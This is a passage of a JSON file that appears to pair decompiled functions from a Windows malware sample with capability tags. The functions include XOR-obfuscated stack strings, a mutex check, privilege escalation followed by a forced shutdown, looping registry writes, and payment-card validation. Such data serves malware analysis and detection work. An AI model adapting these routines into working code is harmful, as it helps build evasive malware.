&StringSid),  iVar3 != 0 &&\n                (StringSid != 0)))) {\n                var_34h = 0x3475643b;\n                var_30h = 0x58496803;\n                var_2ch = 0x64453201;\n                var_28h = 0x680a3469;\n                var_24h._0_2_ = 0x5864;\n                var_20h = 0x34586468;\n                var_1ch._0_1_ = 0x32;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                do {\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n                    if (iVar5 != 0xa2c95c) {\n                        var_10h = 5;\n                        *(iVar6 + iVar3) = *(&var_20h + iVar6 % 5) ^ (iVar6 + iVar3)[&var_34h - iVar3];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x12);\n                iVar5 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(iVar3, StringSid);\n                iVar6 = var_14h;\n                if (iVar5 == 0) {\n                    iVar6 = 1;\n                }\n                (*_sym.imp.KERNEL32.dll_LocalFree)(StringSid);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = var_18h;\n            }\n            (*_sym.imp.KERNEL32.dll_GlobalFree)(puVar4);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return iVar6;\n}\n",
        "token_count": 868
    },
    "00409c86": {
        "rules": [
            "contain obfuscated stackstrings",
            "query environment variable",
            "get disk information",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00409c86(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint lpDst;\n    uint lpszShortPath;\n    uint ARG_0;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint *var_98h;\n    uint *var_94h;\n    uint var_8ch;\n    uint hObject;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    int32_t lpLibFileName;\n    uint var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t lpszLongPath;\n    \n    lpszLongPath = *0x41daac;\n    var_40h = 0x6504611c;\n    puVar8 = &lpDst;\n    for (iVar6 = 0x410; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_3ch = 0x730f3920;\n    var_38h = 0x61504901;\n    puVar8 = &ARG_0;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_34h = 0x396c6501;\n    var_30h = 0x4916733d;\n    puVar8 = &ARG_0;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_2ch = 0x65006140;\n    var_28h = 0x7304393d;\n    puVar8 = &lpszShortPath;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_24h = 0x610a4908;\n    var_20h = 0x39156541;\n    var_1ch._0_1_ = 2;\n    var_1ch._1_1_ = 0x73;\n    var_1ch._2_1_ = 8;\n    var_1ch._3_1_ = 0x49;\n    var_18h._0_1_ = 0x5d;\n    var_18h._1_2_ = 0x5d61;\n    var_18h._3_1_ = 0x65;\n    var_14h._0_1_ = 0x2c;\n    var_14h._1_2_ = 0x1939;\n    var_14h._3_1_ = 0x73;\n    var_10h._0_1_ = 0;\n    var_10h._1_1_ = 0x49;\n    var_10h._2_1_ = 0x39;\n    var_10h._3_1_ = 0x61;\n    var_54h = 0x65736139;\n    var_50h._0_1_ = 0x49;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_68h = 5;\n    iVar7 = 0;\n    var_6ch = iVar6;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar3 != 0x8a0126) {\n            *(iVar7 + iVar6) = *(&var_54h + iVar7 % var_68h) ^ (iVar7 + iVar6)[&var_40h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x34);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar6, &lpDst, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetShortPathNameW)(lpszLongPath, &lpszShortPath, 0x104);\n    var_2ch = 0x717f7651;\n    var_28h = 0x76516824;\n    var_24h = 0x68347172;\n    var_1ch._2_1_ = 5;\n    var_20h = 0x71317605;\n    var_1ch._0_1_ = 0x35;\n    var_1ch._1_1_ = 0x68;\n    var_1ch._3_1_ = 0x76;\n    var_18h._0_1_ = 0x70;\n    var_18h._1_2_ = 0x6271;\n    var_18h._3_1_ = 0x68;\n    var_14h._0_1_ = 2;\n    var_14h._1_2_ = 0x7276;\n    var_14h._3_1_ = 0x71;\n    var_10h._0_1_ = 0x47;\n    var_10h._1_1_ = 0x68;\n    var_64h = 0x71507671;\n    var_60h._0_2_ = 0x6847;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_ch = 6;\n    iVar7 = 0;\n    var_54h = iVar6;\n    lpszLongPath = &var_2ch - iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar3 != 0x6bbf47) {\n            *(iVar7 + iVar6) = *(&var_64h + iVar7 % var_ch) ^ (iVar7 + iVar6)[&var_2ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar6, &lpszShortPath);\n    var_4ch = 0x4447723f;\n    var_48h = 0x722c685e;\n    var_44h = 0x68304441;\n    lpLibFileName = 0x4432724d;\n    puVar8 = &var_a8h;\n    for (iVar6 = 0x3c; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_58h._0_2_ = 0x6830;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    var_9ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_64h = var_9ch;\n    lpszLongPath = &var_4ch - var_9ch;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar7 != 0x73abff) {\n            *(iVar6 + var_9ch) = *(&lpLibFileName + iVar6 % var_ch) ^ (iVar6 + var_9ch)[&var_4ch - var_9ch];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    var_98h = &lpDst;\n    var_a8h = 0x3c;\n    var_94h = &ARG_0;\n    var_8ch = 3;\n    var_a4h = 0x40;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    var_10h._1_1_ = 6;\n    var_18h._0_1_ = 0x3b;\n    var_18h._1_2_ = 0x371e;\n    var_18h._3_1_ = 0x26;\n    var_14h._0_1_ = 0x36;\n    var_14h._1_2_ = 0x5a7f;\n    var_14h._3_1_ = 0x78;\n    var_10h._0_1_ = 0x16;\n    var_10h._2_1_ = 0x16;\n    var_10h._3_1_ = 0x4c;\n    var_48h = 0x6a725668;\n    var_44h = CONCAT22(var_44h._2_2_, 0x4c7a);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    lpLibFileName = iVar6;\n    lpszLongPath = &var_18h - iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar3 != 0x8e3dfc) {\n            *(iVar7 + iVar6) = *(&var_48h + iVar7 % var_ch) ^ (iVar7 + iVar6)[&var_18h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xc);\n    var_1ch._0_1_ = 5;\n    var_1ch._1_1_ = 0x24;\n    var_1ch._2_1_ = 0x3d;\n    var_1ch._3_1_ = 0x25;\n    var_18h._0_1_ = 0x39;\n    var_18h._1_2_ = 0x3413;\n    var_18h._3_1_ = 0x3d;\n    var_14h._0_1_ = 0x2a;\n    var_14h._1_2_ = 0x2220;\n    var_14h._3_1_ = 0x29;\n    var_10h._0_1_ = 0x1d;\n    var_10h._1_1_ = 0x31;\n    var_10h._2_1_ = 2;\n    var_10h._3_1_ = 0x56;\n    var_ch = 0x49584c56;\n    var_8h._0_1_ = 0x55;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    lpszLongPath = &var_1ch - iVar6;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetInputState)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0x21a17e) {\n            *(iVar7 + iVar6) = *(&var_ch + iVar7 % var_68h) ^ (iVar7 + iVar6)[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    while( true ) {\n        var_a0h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar7 = (*pcVar5)(&var_a8h);\n        if (iVar7 != 0) break;\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar7 != 0x4c7) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_64h);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_54h);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_6ch);\n    (*pcVar5)(uVar2);\n    return 1;\n}\n",
        "token_count": 3219
    },
    "0040d20c": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * __fastcall fcn.0040d20c(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    uint *puVar8;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uchar *ARG_0;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_54h = 0x1b03261d;\n    iVar6 = 8;\n    puVar8 = &var_2ch;\n    var_18h = param_2;\n    for (iVar5 = iVar6; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_50h = 0x26391545;\n    var_4ch = 0x13633804;\n    puVar8 = &var_44h;\n    for (iVar5 = iVar6; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_48h = 0x4b042637;\n    var_24h = 0x4b77435a;\n    puVar8 = &var_3ch;\n    for (iVar5 = iVar6; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_20h._0_2_ = 0x7a37;\n    puVar8 = &var_34h;\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 6;\n    iVar6 = 0;\n    var_ch = &var_54h - iVar5;\n    var_8h = iVar5;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        if (iVar2 != 0xac7b17) {\n            *(iVar6 + iVar5) = *(&var_24h + iVar6 % var_4h) ^ (iVar6 + iVar5)[var_ch];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x10);\n    var_54h = 0x1622330d;\n    var_50h = 0x62650a26;\n    var_4ch = 0x3a0a2756;\n    var_48h = CONCAT31(var_48h._1_3_, 0x50);\n    var_24h = 0x78505666;\n    var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x43);\n    uVar1 = (*pcVar4)(8, 0xe);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    ARG_0 = 0x5;\n    iVar6 = 0;\n    var_1ch = iVar5;\n    var_ch = &var_54h - iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        iVar2 = var_8h;\n        if (iVar3 != 0xba32d9) {\n            *(iVar6 + iVar5) = *(&var_24h + iVar6 % ARG_0) ^ (iVar6 + iVar5)[&var_54h - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xd);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5, var_8h);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar4 != NULL) {\n        iVar6 = (*pcVar4)(var_14h, &var_2ch, &var_44h, &var_3ch, &var_34h);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (iVar6 != 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n            ARG_0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            var_54h = 0x101f024c;\n            var_50h = 0x4b115976;\n            puVar7 = ARG_0;\n            for (iVar5 = 0x104; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_4ch = 0x197e0517;\n            var_48h = CONCAT31(var_48h._1_3_, 0x69);\n            var_24h = 0x35326669;\n            var_20h._0_2_ = 0x6146;\n            uVar1 = (*pcVar4)(8, 0xe);\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_14h = &var_54h - iVar5;\n            do {\n                iVar2 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                puVar7 = ARG_0;\n                if (iVar2 != 0xdf587e) {\n                    *(iVar6 + iVar5) = *(&var_24h + iVar6 % var_4h) ^ (iVar6 + iVar5)[&var_54h - iVar5];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xd);\n            (*_sym.imp.USER32.dll_wsprintfA)(ARG_0, iVar5, var_18h, var_28h, var_2ch);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            iVar5 = var_1ch;\n            iVar2 = var_8h;\n            goto code_r0x0040d420;\n        }\n    }\n    puVar7 = NULL;\ncode_r0x0040d420:\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    uVar1 = (*pcVar4)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return puVar7;\n}\n",
        "token_count": 1728
    },
    "0040d447": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040d447(uint param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    var_ch = param_1;\n    if (*0x41e1e8 == NULL) {\n        var_24h = 0x1622330d;\n        var_20h = 0x62650a26;\n        var_1ch = 0x3a0a2756;\n        var_18h._0_1_ = 0x50;\n        var_14h = 0x78505666;\n        var_10h._0_1_ = 0x43;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n            if (iVar3 != 0xba32d9) {\n                var_8h = 5;\n                *(iVar4 + iVar2) = *(&var_14h + iVar4 % 5) ^ (iVar4 + iVar2)[&var_24h - iVar2];\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0xd);\n        iVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar2);\n        if (iVar4 != 0) {\n            *0x41e1e8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar4, 0x411a0c);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        if (*0x41e1e8 == NULL) goto code_r0x0040d51d;\n    }\n    iVar2 = (**0x41e1e8)(var_ch, &var_4h);\n    if (iVar2 == 0) {\n        var_4h = 0xffffffff;\n    }\ncode_r0x0040d51d:\n    if (iVar4 != 0) {\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar4);\n    }\n    return var_4h;\n}\n",
        "token_count": 605
    },
    "0040d584": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040d584(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_16ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_46h;\n    uint var_42h;\n    uint var_3eh;\n    uint var_3ah;\n    uint var_36h;\n    uint var_32h;\n    uint var_2eh;\n    uint var_2ah;\n    uint var_26h;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_5ch = 0x37140000;\n    var_58h = 0x171d322f;\n    var_54h = 0xc3a151f;\n    puVar6 = &var_16ch;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_50h = 0x3c2b2c00;\n    var_60h = 0;\n    var_4ch._0_1_ = 9;\n    var_64h = 6;\n    var_4ch._1_1_ = 6;\n    stack0xffffffb2 = 0x13a0f1f;\n    var_46h = 0x202f2c16;\n    var_42h = 0x2a363133;\n    var_3eh = 0x371c0a21;\n    var_3ah = 0x11d360e;\n    var_36h = 0x333d372a;\n    var_32h = 0x362c2d3b;\n    var_2eh = 0x2c261c1d;\n    var_2ah = 0x37173c73;\n    var_26h = 0x15013a2c;\n    var_22h = 0x90430;\n    var_1eh = 0xf2b261c;\n    var_1ah = 0x581f164a;\n    var_8h = 0x43726f53;\n    var_4h._0_1_ = 0x58;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x47);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_ch = 5;\n    var_68h = iVar4;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar2 != 0xf1b5da) {\n            *(iVar5 + iVar4) = *(&var_8h + iVar5 % var_ch) ^ (iVar5 + iVar4)[&var_5ch - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x46);\n    var_8h = 0x6249514a;\n    var_4h._0_1_ = 0x79;\n    var_14h = 0x52796478;\n    var_10h._0_2_ = 0x4979;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_ch = &var_8h - iVar4;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        iVar2 = var_68h;\n        if (iVar3 != 0x9e70fc) {\n            *(iVar5 + iVar4) = *(&var_14h + iVar5 % var_64h) ^ (iVar5 + iVar4)[&var_8h - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 5);\n    do {\n        iVar5 = 0;\n        do {\n            var_ch = 0;\n            (*_sym.imp.USER32.dll_wsprintfA)(&var_16ch, iVar2, iVar5);\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000001, &var_16ch, &var_ch);\n            if (iVar3 == 0) {\n                var_60h = 3;\n                (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(var_ch, iVar4, 0, 4, &var_60h, 4);\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_ch);\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 5);\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 1219
    },
    "0040de8a": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "terminate process",
            "create mutex"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040de8a(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1bh;\n    uint var_17h;\n    uint var_13h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    var_40h = 0x6917511b;\n    var_3ch = 0x513e3231;\n    var_38h = 0x3220691b;\n    var_34h = 0x6937512d;\n    var_30h = 0x513c322d;\n    var_2ch = 0x323a6900;\n    var_28h = 0x691d5118;\n    var_24h = 0x5126322a;\n    var_8h = 6;\n    var_20h._0_1_ = 6;\n    stack0xffffffdd = 0x20321769;\n    var_1bh = 0x26690051;\n    var_17h = 0x16512932;\n    var_13h._0_2_ = 0x4369;\n    var_13h._2_1_ = 0x32;\n    stack0xffffffec = 0x69725148;\n    var_ch._0_2_ = 0x3243;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar4 = 0;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar3 != 0x8825a8) {\n            *(iVar4 + iVar2) = *(&var_13h + iVar4 % var_8h + 3) ^ (iVar4 + iVar2)[&var_40h - iVar2];\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x30);\n    iVar4 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x1f0001, 0, iVar2);\n    if (iVar4 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, iVar2);\n    }\n    else {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 686
    },
    "0040fcbb": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "modify access privileges",
            "shutdown system"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040fcbb(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint NewState;\n    uint lpLuid;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint TokenHandle;\n    uint var_4h;\n    \n    var_34h = 0xa360d6a;\n    var_30h = 0xa0c4d45;\n    var_2ch = 0x1a695e15;\n    var_28h = 0x5559140c;\n    var_24h = 0x3007020d;\n    var_10h = 0x62656839;\n    var_ch._0_1_ = 0x30;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    do {\n        iVar5 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar5 != 0xb6cbba) {\n            var_4h = 5;\n            *(iVar6 + iVar4) = *(&var_10h + iVar6 % 5) ^ (iVar6 + iVar4)[&var_34h - iVar4];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x14);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n    (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n    (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, iVar4, &lpLuid);\n    NewState = 1;\n    var_14h = 2;\n    (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0, 0, 0);\n    pcVar2 = _sym.imp.USER32.dll_ExitWindowsEx;\n    iVar6 = (*_sym.imp.USER32.dll_ExitWindowsEx)(6, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        (*pcVar2)(4, 0);\n    }\n    uVar3 = (*pcVar1)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return;\n}\n",
        "token_count": 631
    },
    "004037f6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004037f6(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint hModule;\n    uint var_4h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        iVar6 = 0x104;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(param_1, iVar3, iVar6);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if ((iVar4 == 0) || (iVar6 != iVar4)) break;\n            iVar6 = iVar6 + 0x104;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar1)(8, iVar6 * 2);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        } while (iVar3 != 0);\n        if (iVar3 != 0) {\n            if (iVar4 != 0) {\n                *param_2 = iVar3;\n                return 0;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            return uVar2;\n        }\n    }\n    return 8;\n}\n",
        "token_count": 424
    },
    "00403bf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
